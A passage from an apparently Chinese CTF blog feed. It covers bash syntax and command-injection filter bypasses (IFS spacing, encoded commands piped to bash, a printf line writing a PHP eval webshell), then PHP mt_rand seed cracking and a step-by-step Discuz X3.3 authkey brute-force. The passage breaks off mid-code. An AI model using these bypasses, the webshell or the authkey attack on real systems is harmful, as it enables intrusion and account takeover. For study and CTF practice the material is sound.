-a)</code>可以执行，但是<code>test=$&#123;ls–a&#125;</code>语法上面是有错误的。估计也和上面所说的原因有关。</p><p>另外，从网上摘录的区别如下：</p><ul><li>()只是对一串命令重新开一个子shell进行执行</li><li>{}对一串命令在当前shell执行</li><li>()和{}都是把一串的命令放在括号里面，并且命令之间用;号隔开</li><li>()最后一个命令可以不用分号</li><li>{}最后一个命令要用分号</li><li>{}的第一个命令和左括号之间必须要有一个空格</li><li>()里的各命令不必和括号有空格</li><li>()和{}中括号里面的某个命令的重定向只影响该命令，但括号外的重定向则影响到括号里的所有命令</li></ul><p>这里引出来<code>[..]</code>和<code>[[...]]</code>的区别：使用<code>[[...]]</code>条件判断结构, 而不是<code>[...]</code>, 能够防止脚本中的许多逻辑错误.比如<code>&amp;&amp;</code>,<code>||</code>,<code>&lt;</code>,和<code>&gt;</code> 操作符能够正常存在于<code>[[ ]]</code>条件判断结构中, 但是如果出现在<code>[]</code>结构中的话，会报错。</p><p>对<code>&#123;&#125;</code>和<code>()</code>而言, 括号中的重定向符只影响该条命令， 而括号外的重定向符影响到括号中的所有命令。</p><h3 id="输入输出-重定向"><a href="#输入输出-重定向" class="headerlink" title="输入输出/重定向"></a>输入输出/重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;      &gt;&gt;   &lt;   &lt;&lt;   :&gt;   &amp;&gt;   2&amp;&gt;   2&lt;&gt;&gt;&amp;   &gt;&amp;2</span><br></pre></td></tr></table></figure><p>文件描述符(File Descriptor)，用一个数字（通常为0-9）来表示一个文件。</p><table><thead><tr><th align="left">文件描述符</th><th align="left">名称</th><th align="left">常用缩写</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">标准输入</td><td align="left">stdin</td><td align="left">键盘</td></tr><tr><td align="left">1</td><td align="left">标准输出</td><td align="left">stdout</td><td align="left">屏幕</td></tr><tr><td align="left">2</td><td align="left">标准错误输出</td><td align="left">stderr</td><td align="left">屏幕</td></tr></tbody></table><p>我们在简单地用<code>&lt;</code>或<code>&gt;</code>时，相当于使用<code>0&lt;</code>或<code>1&gt;</code>（下面会详细介绍）。</p><ul><li><p>cmd &gt; file<br>把cmd命令的输出重定向到文件file中。如果file已经存在，则清空原有文件，使用bash的noclobber选项可以防止复盖原有文件。</p></li><li><p>cmd &gt;&gt; file<br>把cmd命令的输出重定向到文件file中，如果file已经存在，则把信息加在原有文件后面。</p></li><li><p>cmd &lt; file<br>使cmd命令从file读入</p></li><li><p>cmd &lt;&lt; text<br>从命令行读取输入，直到一个与text相同的行结束。除非使用引号把输入括起来，此模式将对输入内容进行shell变量替换。如果使用<code>&lt;&lt;-</code> ，则会忽略接下来输入行首的tab，结束行也可以是一堆tab再加上一个与text相同的内容，可以参考後面的例子。</p></li><li><p>cmd &lt;&lt;&lt; word<br>把word（而不是文件word）和后面的换行作为输入提供给cmd。</p></li><li><p>cmd &lt;&gt; file<br>以读写模式把文件file重定向到输入，文件file不会被破坏。仅当应用程序利用了这一特性时，它才是有意义的。</p></li><li><p>cmd &gt;| file<br>功能同&gt;，但即便在设置了noclobber时也会复盖file文件，注意用的是|而非一些书中说的!，目前仅在csh中仍沿用<code>&gt;!</code>实现这一功能。</p></li><li><p>: &gt; filename</p><p>把文件<code>filename</code>截断为0长度。如果文件不存在, 那么就创建一个0长度的文件(与<code>touch</code>的效果相同).</p></li><li><p>cmd &gt;&amp;n</p><p>把输出送到文件描述符n</p></li><li><p>cmd m&gt;&amp;n</p><p>把输出到文件符m的信息重定向到文件描述符n</p></li><li><p>cmd &gt;&amp;-</p><p>关闭标准输出</p></li><li><p>cmd &lt;&amp;n</p><p>输入来自文件描述符n</p></li><li><p>cmd m&lt;&amp;n</p><p>m来自文件描述各个n</p></li><li><p>cmd &lt;&amp;-</p><p>关闭标准输入</p></li><li><p>cmd &lt;&amp;n-</p><p>移动输入文件描述符n而非复制它。</p></li><li><p>cmd &gt;&amp;n-</p><p>移动输出文件描述符n而非复制它。<br>注意： <code>&gt;&amp;</code>实际上复制了文件描述符，这使得<code>cmd &gt; file 2&gt;&amp;1</code>与<code>cmd 2&gt;&amp;1 &gt;file</code>的效果不一样。</p></li></ul><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>还有一类通配符，首先先了解下什么是Linux shell通配符/glob模式:</p><blockquote><p>glob 模式（globbing）也被称之为 shell 通配符，名字的起源来自于 Unix V6 中的 <code>/etc/glob</code> （详见 man 文档）。glob 是一种特殊的模式匹配，最常见的是通配符拓展，也可以将 glob 模式设为精简了的正则表达式，在最新的 CentOS 7 中已经删除了 glob 的相关描述文档，删除的原因由于 glob 已经整合到了 shell 之中，然后就有了 shell 通配符。<strong>shell 通配符 / glob 模式通常用来匹配目录以及文件，而不是文本！！！</strong></p></blockquote><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><table><thead><tr><th align="left">字符</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">匹配任意长度任意字符</td></tr><tr><td align="left">?</td><td align="left">匹配任意单个字符</td></tr><tr><td align="left">[list]</td><td align="left">匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td></tr><tr><td align="left">[^list]</td><td align="left">匹配指定范围外的任意单个字符或字符集合</td></tr><tr><td align="left">[!list]</td><td align="left">同<code>[^list]</code></td></tr><tr><td align="left">{str1,str2,…}</td><td align="left">匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td></tr><tr><td align="left">IFS</td><td align="left">由 &lt; space &gt; 或 &lt; tab &gt; 或 &lt; enter &gt; 三者之一组成</td></tr><tr><td align="left">CR</td><td align="left">由 &lt; enter &gt; 产生</td></tr><tr><td align="left">!</td><td align="left">执行 history 中的命令</td></tr></tbody></table><p>以及还有专用字符集</p><table><thead><tr><th align="left">字符</th><th align="left">意义</th></tr></thead><tbody><tr><td align="left">[:alnum:]</td><td align="left">任意数字或者字母</td></tr><tr><td align="left">[:alpha:]</td><td align="left">任意字母</td></tr><tr><td align="left">[:space:]</td><td align="left">空格</td></tr><tr><td align="left">[:lower:]</td><td align="left">小写字母</td></tr><tr><td align="left">[:digit:]</td><td align="left">任意数字</td></tr><tr><td align="left">[:upper:]</td><td align="left">任意大写字母</td></tr><tr><td align="left">[:cntrl:]</td><td align="left">控制符</td></tr><tr><td align="left">[:graph:]</td><td align="left">图形</td></tr><tr><td align="left">[:print:]</td><td align="left">可打印字符</td></tr><tr><td align="left">[:punct:]</td><td align="left">标点符号</td></tr><tr><td align="left">[:xdigit:]</td><td align="left">十六进制数</td></tr><tr><td align="left">[:blank:]</td><td align="left">空白字符</td></tr></tbody></table><ul><li>在使用专属字符集的时候，字符集之外还需要用 [ ] 来包含住，否则专用字符集不会生效，例如<code>[[:space:]]</code></li><li>想要转义的时候，单引号与双引号使用方法是不同的，单引号会转义所有字符，而且单引号中间不允许再出现单引号，双引号允许出现特定的 shell 元字符，具体字符可以自行查询</li><li>在使用花括号 {} 的时候，里面的单个字符串需要使用单引号或者双引号括住，否则就会视为多个的单个字符</li></ul><h2 id="命令执行的一些绕过技巧"><a href="#命令执行的一些绕过技巧" class="headerlink" title="命令执行的一些绕过技巧"></a>命令执行的一些绕过技巧</h2><h3 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1. 空格绕过"></a>1. 空格绕过</h3><p>空格可以用以下字符串代替：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 $&#123;IFS&#125;、$IFS等</span><br></pre></td></tr></table></figure><p>$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用<br>，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><h3 id="2-一些命令分隔符"><a href="#2-一些命令分隔符" class="headerlink" title="2.一些命令分隔符"></a>2.一些命令分隔符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure><p>1、在 shell 中，担任”连续指令”功能的符号就是”;”<br>2、”&amp;” 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。<br>3、管道符”|”左边命令的输出就会作为管道符右边命令的输入，所以左边的输出并不显示</p><h3 id="3-花括号的别样用法"><a href="#3-花括号的别样用法" class="headerlink" title="3.花括号的别样用法"></a>3.花括号的别样用法</h3><p>在Linux bash中还可以使用<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令</p><p><img src="/2019/12/31/command-exec-bypass/20190915145314225.png"></p><h3 id="4-黑名单绕过"><a href="#4-黑名单绕过" class="headerlink" title="4.黑名单绕过"></a>4.黑名单绕过</h3><h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><p>比如：<code>a=l;b=s;$a$b</code><br>上面的第二道题目也是利用偶读拼接方法绕过黑名单：<code>a=fl;b=ag;cat $a$b</code></p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p><strong>base64：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> MTIzCg==|base64 -d 其将会打印<span class="number">123</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span>|base64-d|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure><p><strong>hex：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;636174202f666c6167&quot;</span> | xxd -r -p|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure><p><strong>oct：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>) ==&gt;ls</span><br><span class="line">$(printf <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>) ==&gt;cat /flag</span><br><span class="line">&#123;printf,<span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>&#125;|\$<span class="number">0</span> ==&gt;cat /flag</span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;</span></span><br><span class="line">$&#123;printf,<span class="string">&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;</span>&#125; &gt;&gt; <span class="number">1.</span>php</span><br></pre></td></tr></table></figure><h4 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a>单引号和双引号绕过</h4><p>比如：<code>ca&#39;&#39;t flag</code> 或<code>ca&quot;&quot;t flag</code></p><h4 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a>反斜杠绕过</h4><p>比如：<code>ca\t fl\ag</code></p><h4 id="利用Shell-特殊变量绕过"><a href="#利用Shell-特殊变量绕过" class="headerlink" title="利用Shell 特殊变量绕过"></a>利用Shell 特殊变量绕过</h4><table><thead><tr><th align="center">变量</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">$0</td><td align="center">当前脚本的文件名</td></tr><tr><td align="center">$n</td><td align="center">传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空</td></tr><tr><td align="center">$#</td><td align="center">传递给脚本或函数的参数个数</td></tr><tr><td align="center">$$</td><td align="center">当前shell进程ID</td></tr><tr><td align="center">$*</td><td align="center">传递给脚本或函数的所有参数，而参数不存在时其值为空</td></tr><tr><td align="center">$@</td><td align="center">传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同</td></tr><tr><td align="center">$?</td><td align="center">上个命令的推出状态，或函数的返回值</td></tr></tbody></table><p><strong>linux shell中$n表示传递给脚本或函数的参数</strong>。n 是一个数字，表示第几个参数。<br>例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。<br>$@表示<br>比如：<code>ca$@t fla$@g</code><br><code>ca$1t fla$2g</code></p><h3 id="5-长度限制"><a href="#5-长度限制" class="headerlink" title="5.长度限制"></a>5.长度限制</h3><p>长度限制可以用<strong>文件构造</strong>的方式来绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux下可以用 1&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;<span class="built_in">test</span>则会将目录按时间排序后写进<span class="built_in">test</span>文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure><h3 id="6-内联执行"><a href="#6-内联执行" class="headerlink" title="6.内联执行"></a>6.内联执行</h3><p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。<br>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a`pwd`&quot;</span></span><br></pre></td></tr></table></figure><p>类似的还有$(command).<br>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> “abcd $(<span class="built_in">pwd</span>)”</span><br></pre></td></tr></table></figure><h3 id="7-通配符"><a href="#7-通配符" class="headerlink" title="7.通配符"></a>7.通配符</h3><p>上面已经记过</p><p>参考：</p><p><a href="https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">https://blog.zeddyu.info/2019/01/17/命令执行/</a></p><p><a href="https://blog.csdn.net/silence1_/article/details/96135760">https://blog.csdn.net/silence1_/article/details/96135760</a></p><p><a href="https://www.freebuf.com/articles/web/137923.html">https://www.freebuf.com/articles/web/137923.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> bypass </tag>
            
            <tag> ctf </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪随机数</title>
      <link href="2019/12/30/php-fakerandom-number/"/>
      <url>2019/12/30/php-fakerandom-number/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了php伪随机数的相关内容！！！</p><a id="more"></a><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="mt-rand"><a href="#mt-rand" class="headerlink" title="mt_rand()"></a>mt_rand()</h3><p>mt_rand函数有两个可选参数 min 和 max，如果没有提供可选参数，mt_rand函数将返回返回 0 到 mt_getrandmax() 之间的伪随机数。例如想要 5 到 15（包括 5 和 15）之间的随机数，用 mt_rand(5, 15)。</p><h3 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand()"></a>mt_srand()</h3><p>用于播下一个更好的随机数发生器种子，用 <code>seed</code> 来给随机数发生器播种。 没有设定 <code>seed</code> 参数时，会被设为随时数。自 PHP 4.2.0 起，不再需要用 <a href="https://www.php.net/manual/zh/function.srand.php">srand()</a> 或 <strong>mt_srand()</strong> 给随机数发生器播种 ，因为现在是由系统自动完成的。</p><p>这张图感觉挺好的</p><p><img src="/2019/12/30/php-fakerandom-number/pseudorandom.png"></p><h2 id="一个题目"><a href="#一个题目" class="headerlink" title="一个题目"></a>一个题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $a = @$_REQUEST[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    $seed = @$_REQUEST[<span class="string">&#x27;seed&#x27;</span>];</span><br><span class="line">    $key = @$_REQUEST[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    mt_srand($seed);</span><br><span class="line">    $true_key = mt_rand();</span><br><span class="line">    <span class="keyword">if</span> ($key == $true_key)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Key Confirm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Key Error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出来这个题目传了三个参数，seed可控，因此我们只需在phpstudy选择相同的php版本设定相同的seed，输出产生的随机数就行</p><h2 id="php版本差别"><a href="#php版本差别" class="headerlink" title="php版本差别"></a>php版本差别</h2><p>php5和php7会用不同的算法来生成随机数，所以即使seed相同生成的随机数也不相同</p><h2 id="php-mt-seed"><a href="#php-mt-seed" class="headerlink" title="php_mt_seed"></a>php_mt_seed</h2><p>php_mt_seed是一个破解mt_rand函数seed的工具，在最简单的调用模式下，它能通过mt_rand第一次输出的值寻找mt_rand的seed，在更高级的模式中它能匹配不是第一次输出的和不明确具体输出的情况。</p><p>p_mt_seed基于命令行运行，命令行可以使用1，2，4或者更多的参数。这些参数需要详细说明mt_rand()的输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lepiaf/php_mt_seed.git</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>4.0版本从这里下载：<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz</a></p><h3 id="一个参数"><a href="#一个参数" class="headerlink" title="一个参数"></a>一个参数</h3><p>当只有一个参数的时候，这个参数代表mt_rand第一次输出的值。</p><h3 id="两个参数"><a href="#两个参数" class="headerlink" title="两个参数"></a>两个参数</h3><p>当有两个参数的时候，他们代表mt_rand第一次输出应该位于什么区间内。</p><p>第一个参数为最小值，第二个参数为最大值。</p><h3 id="四个参数（高级模式）"><a href="#四个参数（高级模式）" class="headerlink" title="四个参数（高级模式）"></a>四个参数（高级模式）</h3><p>前两个参数表示mt_rand输出的值，后两个参数表示mt_rand输出的区间(从0开始)。</p><h3 id="多于五个参数（高级模式）"><a href="#多于五个参数（高级模式）" class="headerlink" title="多于五个参数（高级模式）"></a>多于五个参数（高级模式）</h3><p>每四个参数一组，但是最后一组可以是1，2或4个参数，按照上面的格式。</p><p>详细使用参见：<a href="https://www.openwall.com/php_mt_seed/README">https://www.openwall.com/php_mt_seed/README</a></p><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>这里用的是php7.0</p><p><img src="/2019/12/30/php-fakerandom-number/20191230154805.png"></p><p>假设有这样一个生成随机序列的算法，生成了下图的随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">user_password</span>(<span class="params">$length = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">$allowable_characters = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"> $len = strlen($allowable_characters) - <span class="number">1</span>;</span><br><span class="line"> $pass = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line"> $pass .= $allowable_characters[mt_rand(<span class="number">0</span>, $len)];</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> $pass;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> mt_srand(time());</span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> user_password(), <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/php-fakerandom-number/20191230170601.png"></p><p>写一个程序来转换生成的随机数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;UHsI89HQVr&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">print(str(s.index(i))+<span class="string">&quot; &quot;</span>+str(s.index(i))+<span class="string">&quot; 0 61 &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">//结果：<span class="number">46</span> <span class="number">46</span> <span class="number">0</span> <span class="number">61</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">61</span> <span class="number">18</span> <span class="number">18</span> <span class="number">0</span> <span class="number">61</span> <span class="number">34</span> <span class="number">34</span> <span class="number">0</span> <span class="number">61</span> <span class="number">60</span> <span class="number">60</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">33</span> <span class="number">33</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">17</span> <span class="number">17</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/php-fakerandom-number/20191230170814.png"></p><p>然后我们验证一下用爆破出来的seed是否能生成相同的序列</p><p><img src="/2019/12/30/php-fakerandom-number/20191230171228.png"></p><p>可以看到成功实现</p><h2 id="Discuz-X3-3-authkey生成算法漏洞"><a href="#Discuz-X3-3-authkey生成算法漏洞" class="headerlink" title="Discuz X3.3 authkey生成算法漏洞"></a>Discuz X3.3 authkey生成算法漏洞</h2><p>用户在初次安装软件时，系统会自动生成一个authkey写入全局配置文件和数据库，之后安装文件会被删除。该authkey用于对普通用户的cookie进行加密等密码学操作，但是由于生成算法过于简单，可以利用公开信息进行本地爆破。authkey生成算法位于<code>Discuz_X3.3_SC_UTF8/upload/install/index.php</code>中</p><p>authkey的生成方法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$authkey = substr(md5($_SERVER[<span class="string">&#x27;SERVER_ADDR&#x27;</span>].$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>].$dbhost.$dbuser.$dbpw.$dbname.$username.$password.$pconnect.substr($timestamp, <span class="number">0</span>, <span class="number">6</span>)), <span class="number">8</span>, <span class="number">6</span>).random(<span class="number">10</span>);</span><br></pre></td></tr></table></figure><p>可以看出authkey主要由两部分组成：</p><p>MD5的一部分（前6位） + random生成的10位</p><p>跟入random函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length</span>) </span>&#123;</span><br><span class="line">$hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">$max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">PHP_VERSION &lt; <span class="string">&#x27;4.2.0&#x27;</span> &amp;&amp; mt_srand((<span class="keyword">double</span>)microtime() * <span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">$hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于字符生成集合是固定的，且没有重复字符，那么函数中每一次生成hash都唯一对应了chars数组中的一个位置，而且是使用同一个seed生成的。</p><p>在之后的代码中使用了同样的random函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_config[<span class="string">&#x27;cookie&#x27;</span>][<span class="string">&#x27;cookiepre&#x27;</span>] = random(<span class="number">4</span>).<span class="string">&#x27;_&#x27;</span>;</span><br></pre></td></tr></table></figure><p>Cookie的前四个字节是已知的，并且使用了同样的random函数，那么思路很明显：</p><p>通过已知的4位，算出random使用的种子，进而得到authkey后10位。那剩下的就需要搞定前6位，根据其生成算法，只好选择爆破的方式，由于数量太大，就一定要选择一个本地爆破的方式（即使用到authkey而且加密后的结果是已知的）。</p><p>在调用authcode函数很多的地方都可以进行校验，在这里使用找回密码链接中的id和sign参数：</p><p>sign生成的方法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dsign</span>(<span class="params">$str, $length = <span class="number">16</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> substr(md5($str.getglobal(<span class="string">&#x27;config/security/authkey&#x27;</span>)), <span class="number">0</span>, ($length ? max(<span class="number">8</span>, $length) : <span class="number">16</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破authkey 的流程：</p><ol><li>通过cookie前缀爆破随机数的seed。使用php_mt_seed工具。</li><li>用seed生成random(10)，得到所有可能的authkey后缀。</li><li>给自己的账号发送一封找回密码邮件，取出找回密码链接。</li><li>用生成的后缀爆破前6位，范围是0x000000-0xffffff，和找回密码url拼接后做MD5求出sign。</li><li>将求出的sign和找回密码链接中的sign对比，相等即停止，获取当前的authkey。</li></ol><h2 id="mt-rand-的一种新思路"><a href="#mt-rand-的一种新思路" class="headerlink" title="mt_rand()的一种新思路"></a>mt_rand()的一种新思路</h2><p>参见Hgame上面的一道题：<a href="https://www.moonback.xyz/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/#%E4%BA%8C%E5%8F%91%E5%85%A5%E9%AD%82%EF%BC%81">https://www.moonback.xyz/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/#%E4%BA%8C%E5%8F%91%E5%85%A5%E9%AD%82%EF%BC%81</a></p><h2 id="rand-函数安全"><a href="#rand-函数安全" class="headerlink" title="rand()函数安全"></a>rand()函数安全</h2><p>后来了解到这个函数在某些条件下生成的随机数也是可以预测的</p><p>先说下在linux下，PHP rand函数在底层使用的是glibc rand()，它会保留前面生成随机数的数据，作为后面随机数生成的依据，以此保证伪随机数的均匀性，但这样会导致严重的安全问题，也就是如果我们知道前面生成的随机序列，那么完全可以预测后面的随机数，公式：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num[n] = (num[n<span class="number">-3</span>] + num[n<span class="number">-31</span>]) mod (MAX)</span><br></pre></td></tr></table></figure><p>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span 